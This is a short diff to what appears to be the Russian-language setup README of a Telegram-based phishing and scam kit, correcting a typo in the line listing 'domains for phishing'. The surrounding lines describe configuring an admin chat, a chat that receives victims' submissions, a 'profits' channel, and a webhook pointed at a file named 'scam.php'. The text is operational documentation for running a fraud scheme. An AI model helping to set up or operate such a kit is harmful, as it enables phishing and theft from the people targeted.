@@ -12,7 +12,7 @@ ____
   8)`chatAdmin - ID чата админов`
   9)`chatAlerts - ID чата куда будут приходить заявки`
   10)`chatProfits - ID канала профитов`
-  11)`allDomains- домены дял фишинга `
+  11)`allDomains- домены для фишинга `
  
  ____
 2) Кинуть webhook на файлик `scam.php`
